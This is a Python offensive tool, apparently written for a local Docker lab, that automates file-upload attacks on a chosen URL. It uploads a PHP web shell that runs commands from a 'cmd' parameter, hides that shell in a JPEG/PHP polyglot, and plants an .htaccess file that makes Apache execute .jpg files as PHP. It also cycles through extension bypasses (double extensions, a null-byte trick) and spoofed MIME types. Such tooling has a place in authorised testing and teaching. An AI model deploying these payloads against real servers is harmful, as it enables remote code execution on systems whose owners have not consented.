import requests
import os
import argparse

# --- COLORS FOR KALI TERMINAL ---
G = '\033[92m'  # Green
Y = '\033[93m'  # Yellow
R = '\033[91m'  # Red
W = '\033[0m'   # White

def banner():
    # 'fr' prefix fixes the SyntaxWarning by treating backslashes as raw text
    print(fr"""{G}
    __   _ __           ________              __  
    \ \ / /(_)        / ____/ /_  ___  _____/ /__
     \ V / / /|      / /   / __ \/ _ \/ ___/ //_/
      \ / / / |     / /___/ / / /  __/ /__/ ,<   
       \_/_/_/|_|____\____/_/ /_/\___/\___/_/|_|  
                /_____/ File Upload Arsenal v1.0
    {W}""")

def generate_polyglot_php_jpeg():
    """Generates a JPEG with a hidden PHP system payload"""
    jpeg_header = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01'
    php_payload = b'<?php system($_GET["cmd"]); ?>'
    return jpeg_header + php_payload + b'\xff\xd9'

def start_scan(target_url, param_name):
    # 1. Setup Payloads
    payload_content = "<?php system($_GET['cmd']); ?>"
    poly_content = generate_polyglot_php_jpeg()
    
    # 2. Optimized Extension List for RCE
    # Including .htaccess and double-extensions used to bypass Apache filters
    extensions = [
        'php', 'php5', 'phtml', 'phar',      # Core PHP variations
        'php.png', 'php.jpg',                # Double extensions
        'php%00.jpg',                        # Null byte bypass
        '.htaccess'                          # Config override
    ]
    
    # 3. MIME types to spoof
    mimes = ['image/jpeg', 'image/png', 'application/octet-stream']

    print(f"[*] Starting scan on {target_url}...\n")

    for ext in extensions:
        for mime in mimes:
            
            # --- FILENAME LOGIC ---
            if ext == ".htaccess":
                filename = ".htaccess"
                content = "AddType application/x-httpd-php .jpg" # Force Apache to run .jpg as PHP
            else:
                filename = f"vibecheck.{ext}"
                # Use polyglot content if the extension looks like an image
                content = poly_content if ("jpg" in ext or "png" in ext) else payload_content
            
            files = {param_name: (filename, content, mime)}
            
            try:
                r = requests.post(target_url, files=files, timeout=5)
                
                # --- DETECTION LOGIC ---
                # We look specifically for the [+] success indicator from our lab
                success_keywords = ["[+]", "success", "uploaded"]
                is_success = any(word in r.text.lower() for word in success_keywords)

                if r.status_code == 200 and is_success:
                    print(f"{G}[+] REAL SUCCESS: {filename} | MIME: {mime}{W}")
                    print(f"    Verify: http://localhost:8080/uploads/{filename}?cmd=id")
                else:
                    # Show a snippet of the response to debug why it failed
                    reason = r.text[:30].replace('\n', '').strip()
                    print(f"{Y}[-] Blocked/Failed: {filename} ({reason}...){W}")

            except Exception as e:
                print(f"{R}[!] Connection Error: {e}{W}")

    print(f"\n[*] Scan Complete. Check /uploads folder in Docker.")

if __name__ == "__main__":
    banner()
    parser = argparse.ArgumentParser(description="VibeCheck File Upload Vulnerability Tester")
    parser.add_argument("-u", "--url", required=True, help="Target Upload URL")
    parser.add_argument("-p", "--param", required=True, help="Name of the file parameter (e.g., 'upload')")
    
    args = parser.parse_args()
    start_scan(args.url, args.param)
